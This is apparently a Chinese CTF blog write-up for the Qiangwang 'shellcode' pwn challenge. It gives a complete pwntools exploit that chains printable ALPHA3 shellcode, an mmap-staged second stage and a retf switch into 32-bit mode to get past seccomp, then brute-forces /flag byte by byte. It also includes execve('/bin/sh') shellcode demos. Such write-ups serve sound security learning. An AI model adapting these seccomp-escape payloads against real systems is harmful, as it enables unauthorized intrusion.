---
title: 强网先锋 shellcode
date: 2021-07-09 22:52:34
updated: 2021-07-14 10:02:34
tags:
  - pwn
  - seccomp
  - shellcode
categories:
  - pwn
keywords: this the keywords
description: 挺难的 强网先锋 shellcode
top_img:
comments:
cover:
toc:
toc_number:
copyright:
copyright_author:
copyright_author_href:
copyright_url:
copyright_info:
mathjax:
katex:
aplayer:
highlight_shrink:
aside:
---


### seccomp规则
![](https://z3.ax1x.com/2021/07/14/Wes4E9.png) 
值得注意的是
* 没有检查架构
* 没有检查sys_num是否越界
* 只有read,没有write
* 有系统调用号为5的 可切换到32位open
### 思路
1. 可打印的shellcode1 完成read() jmp 接着就能控制执行流
2. 用汇编边写边调 完成在 32bit open 64bit write 延时爆破
### EXP
看了几个大佬的exp 复写了这个 因为这个exp条件要求低，更可控，会把参考的大佬内容放在下面

```python
#!/usr/bin/env python
import os
import time
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

def toPrintable(raw):
    with open("/tmp/raw","wb") as f:
        f.write(asm(raw,arch='amd64'))
    result = os.popen("python2 ~/tools/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=/tmp/raw").read()
    print("[*] Shellcode %s"%result)
    return result

def exp(p,a,b):
    shellcode1 = '''
        mov r10,rbx
        add r10w,0x0140
        xor rdi,rdi
        mov rsi,r10    
        xor rdx,rdx
        add dx,0x1040
        xor rax,rax
        syscall
        jmp r10
    '''
    shellcode2 = '''

        mov rdi,0x40000000
        mov rsi,0x1000
        mov rdx,0x7
        mov r10,0x22
        mov r8,0xFFFFFFFF
        xor r9,r9
        mov rax,0x9
        syscall

        mov rsi,rdi
        xor rdi,rdi
        mov rdx,0x1000
        xor rax,rax
        syscall
        jmp rsi
    '''
    shellcode3_ = '''
        mov r10,0x2300000000
        add rsi,0x13
        add rsi,r10
        push rsi
        retf

        mov esp,0x40000400
        push 0x0067
        push 0x616c662f
        mov ebx,esp
        xor ecx,ecx
        mov edx,0x7
        mov eax,0x5
        int 0x80

        push 0x33
        push 0x40000037
        retf

        mov rdi,rax
        mov rsi,0x40000500
        mov rdx,0x80
        xor rax,rax
        syscall

        push 0
        cmp byte ptr[rsi+{0}],{1}
        jz $-3
        ret 
    '''.format(a,b) if a==0 else '''

        mov r10,0x2300000000
        add rsi,0x13
        add rsi,r10
        push rsi
        retf

        mov esp,0x40000400
        push 0x0067
        push 0x616c662f
        mov ebx,esp
        xor ecx,ecx
        mov edx,0x7
        mov eax,0x5
        int 0x80

        push 0x33
        push 0x40000037
        retf

        mov rdi,rax
        mov rsi,0x40000500
        mov rdx,0x80
        xor rax,rax
        syscall

        push 0
        cmp byte ptr[rsi+{0}],{1}
        jz $-4
        ret 
    '''.format(a,b)
    # shellcode1 = toPrintable(shellcode1)
    # shellcode2 = asm(shellcode2,arch='amd64')
    # shellcode3 = asm(shellcode3,arch='amd64')
	# print "".join("\\x%02x"%ord(_) for _ in asm(shellcode,arch='amd64'))
    shellcode1 = "Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8n0R094y4l0p0S0x188K055M4z0x0A3r054q4z0q2H0p0z402Z002l8K4X00"
    shellcode2 = "\x48\xc7\xc7\x00\x00\x00\x40\x48\xc7\xc6\x00\x10\x00\x00\x48\xc7\xc2\x07\x00\x00\x00\x49\xc7\xc2\x22\x00\x00\x00\x49\xb8\xff\xff\xff\xff\x00\x00\x00\x00\x4d\x31\xc9\x48\xc7\xc0\x09\x00\x00\x00\x0f\x05\x48\x89\xfe\x48\x31\xff\x48\xc7\xc2\x00\x10\x00\x00\x48\x31\xc0\x0f\x05\xff\xe6"
    shellcode3 = "\x49\xba\x00\x00\x00\x00\x23\x00\x00\x00\x48\x83\xc6\x13\x4c\x01\xd6\x56\xcb\xbc\x00\x04\x00\x40\x6a\x67\x68\x2f\x66\x6c\x61\x89\xe3\x31\xc9\xba\x07\x00\x00\x00\xb8\x05\x00\x00\x00\xcd\x80\x6a\x33\x68\x37\x00\x00\x40\xcb\x48\x89\xc7\x48\xc7\xc6\x00\x05\x00\x40\x48\xc7\xc2\x80\x00\x00\x00\x48\x31\xc0\x0f\x05\x6a\x00"
    shellcode3 += asm('cmp byte ptr[rsi+{0}],{1};jz $-3;ret'.format(a,b) if a == 0 else 'cmp byte ptr[rsi+{0}],{1};jz $-4;ret'.format(a,b),arch='amd64')
    p.sendline(shellcode1)
    p.sendline(shellcode2)
    # raw_input()
    p.sendline(shellcode3)
    try:
        p.recv(timeout = 2)
    except:
        p.close()
        return 0
    else:
        return 1
def main():
    flag = [" " for _ in range(0x30)]
    for i in range(0,100):
        # for char in "{}1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
        for char in range(0x20,0x7e+1):
            # char = ord(char)
            p = process("./shellcode")
            if exp(p,i,char):
                flag[i] = chr(char)
                tmp = "".join(_ for _ in flag)
                print(">>>>> %s"%tmp)
                break
            p.close()
if __name__ == '__main__':
    main()
```
### 一些补充的
#### retf
* CPU执行ret指令时,相当于进行
```c
pop IP
```

* CPU执行retf指令时,相当于进行:
```c
pop IP
pop Cs
```
* 32bit cs 0x23 
```c
;;nasm -f elf32 test_cs_32.asm 
;;ld -m elf_i386 -o test_cs_32
global _start
_start:
	push 0x0068732f
	push 0x6e69622f
	mov ebx,esp
	xor ecx,ecx
	xor edx,edx
	mov eax,11
	int 0x80
```
* 64bit cs 0x33 
```c
;;nasm -f elf64 test_cs_64.asm 
;;ld -m elf_x86_64 -o test_cs_64 test_cs_64.o
global _start
_start:
	mov r10,0x0068732f6e69622f
	push r10
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	mov rax,0x3b
	syscall
```
把断点打在 _start 上求证下

#### 验证下 arch的切换
```c
;;nasm -f elf64 test_64.asm 
;;ld -m elf_x86_64 -o test_64 test_64.o
section .data
	flag db '/flag',0x00
	len equ $-flag 

	say db 'What I want is the flag',0xa,0x0
	len2 equ $-say

	space1 times 0x10 dq 0
	store_flag times 0x30 dq 0
section .text
	global _start
_start:
	; wrtie(1,say,len)
	mov rdi,1
	mov rsi,say
	mov rdx,len2
	mov rax,0x1
	syscall

to32bit:
	; retf to 32bit
	push open_32
	mov r15,0x2300000000
	add qword [rsp],r15
	retf

open_32:
	; open("/flag",0,execte|write|read)
	mov ebx,flag
	xor ecx,ecx
	mov edx,0x7
	mov eax,0x5
	int 0x80

to64bit:
	; retf to 64 bit
	mov esp,space1
	push 0x33
	push read_64
	retf

read_64:
	; read(fd,buf,count)
	mov rdi,rax ; fd
	mov rsi,store_flag
	mov rdx,0x80
	xor rax,rax
	syscall
	jmp write_64

write_64:
	;write(fd,buf,count)
	mov rdi,1
	mov rsi,store_flag
	mov rdx,rax ; the count that had read
	mov rax,1
	syscall

	; exit
	mov rax,0x3c
	syscall
```
* 用strace验证下完成了open
![](https://z3.ax1x.com/2021/07/14/WesfHJ.png)
* TIP 编译的时候老是输入同样的命令 不如放入一个shell script里
```SHELL
nasm -f elf64 test.asm
ld -m elf_x86_64 -o test test.o
objdump -d test
echo "\n\n\n\nShellcode"
objdump -d ./test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

* 64位到32位 arch切换时注意，64位下push 会压入一个8byte的数
  如果
```c
push 0x23
push addr
retf
```
栈上会是
```c
rsp->	00----addr----00
        0000000000000023
```
但是切换arch时要求
```c
esp->	0-addr-0
        00000023
```
所以我采用了
```c
to32bit:
    ; retf to 32bit
    push addr
    mov r15,0x2300000000
    add qword [rsp],r15
    retf
```
这样栈上是
```c
rsp->	0-addr-023000000
//也就是
esp->	0-addr-0
        00000023
```

* 32到64切换时
  由于push的位4byte，直接
```c
push 0x23
push addr
retf
```
  
### mmap的使用
使用用mmap申请适合4byte的寄存器的地址

`man mmap`

`void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset);`

| mmap   |                                  |                |
| ------ | -------------------------------- | -------------- |
| addr   | 要申请的地址                     | 建议四位       |
| length | 从addr开始申请的长度             | 建议一页0x1000 |
| prot   | 权限                             | 7              |
| flags  | 确定映射的更新是否对其他进程可见 | 0x22          |
| fd     | 映射到文件描述符fd               | 0xFFFFFFFF          |
| offset | 映射偏移                         | NULL           |

### alpha3的安装使用
安装和使用 会写在参考的链接里 

`python2 ~/tools/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=/tmp/raw`

这里边的raw是汇编后的二进制文件 而不是汇编语句的文件
* 怎么得到raw呢

```python
    def toPrintable(raw):
        with open("/tmp/raw","wb") as f:
            f.write(asm(raw,arch='amd64'))
        result = os.popen("python2 ~/tools/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=/tmp/raw").read()
        print("[*] Shellcode %s"%result)
        return result
```
或者
前面汇编给的TIP中那个shell_script,然后 `echo -en "\x90\x90" > /tmp/raw`
## 参考
1. [系统调用号](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
2. [纯字符shellcode生成指南](http://taqini.space/2020/03/31/alpha-shellcode-gen/)
3. [[原创] 强网杯 几道pwn题的writeup by syclover](https://bbs.pediy.com/thread-268083.htm)
4. [强网杯PWN WP](https://cloud.tencent.com/developer/article/1839670)
5. [汇编 - 快速指南 - WIKI](https://iowiki.com/assembly_programming/assembly_quick_guide.html)
6. [shellcode 的艺术](https://xz.aliyun.com/t/6645)


